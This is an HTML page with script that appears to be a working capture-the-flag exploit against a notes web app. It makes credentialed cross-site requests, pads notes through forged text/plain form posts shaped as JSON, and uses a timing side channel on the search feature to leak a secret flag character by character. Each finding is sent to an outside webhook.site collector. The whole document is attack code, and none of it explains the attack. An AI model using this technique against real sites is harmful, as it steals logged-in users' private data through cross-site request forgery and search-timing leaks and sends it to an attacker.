<!doctype html><html><body><iframe name="sink" style="display:none"></iframe><script>
const TARGET='https://localhost:3000', COLLECT='https://9a73f059-d808-47c4-b035-4281889d9fea.webhook.site/log', NOTE_ID=1, N_SUB=45;
const WORDS=Array(4000).fill('qq').join(' '), PREFIX='inctf{';
const CHARSET="_abcdefghijklmnopqrstuvwxyz0123456789-{}!?.@$#ABCDEFGHIJKLMNOPQRSTUVWXYZ".split('');
const THRESH=70;
function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
async function tryDirect(){for(const u of ['/notes/'+NOTE_ID,'/notes/search?q='+encodeURIComponent(PREFIX)]){try{const r=await fetch(TARGET+u,{credentials:'include'});const t=await r.text();const m=t.match(/inctf\{[^}]*\}/);if(m){log('FLAG_DIRECT',m[0]);return true;}}catch(e){}}return false;}
function addSub(){return new Promise(res=>{const f=document.createElement('form');f.method='POST';f.action=TARGET+'/notes/'+NOTE_ID+'/subnotes';f.enctype='text/plain';f.target='sink';const i=document.createElement('input');i.name='{"content":"';i.value=' '+WORDS+'"}';f.appendChild(i);document.body.appendChild(f);const s=document.getElementsByName('sink')[0];s.onload=()=>{try{f.remove();}catch(e){}res();};f.submit();});}
async function tq(q){const url=TARGET+'/notes/search?q='+encodeURIComponent(q);let b=Infinity;for(let i=0;i<3;i++){const t0=performance.now();try{await fetch(url,{mode:'no-cors',credentials:'include',cache:'no-store'});}catch(e){}const dt=performance.now()-t0;if(dt<b)b=dt;}return b;}
async function run(){log('status','start');if(await tryDirect()){log('status','done_direct');return;}for(let i=0;i<N_SUB;i++){await addSub();}log('status','amp_'+N_SUB);const sl=await tq(PREFIX),fa=await tq('zzqzqzx');log('calib','s='+Math.round(sl)+'_f='+Math.round(fa));const thr=Math.max(THRESH,(sl+fa)/2);let k=PREFIX;log('known',k);for(let p=0;p<80;p++){let f=null;for(const c of CHARSET){if(await tq(k+c)>thr){f=c;break;}}if(f===null){log('status','stuck_'+k);break;}k+=f;log('known',k);if(f==='}'){log('FLAG',k);break;}}log('status','done_'+k);}
run();
</script></body></html>
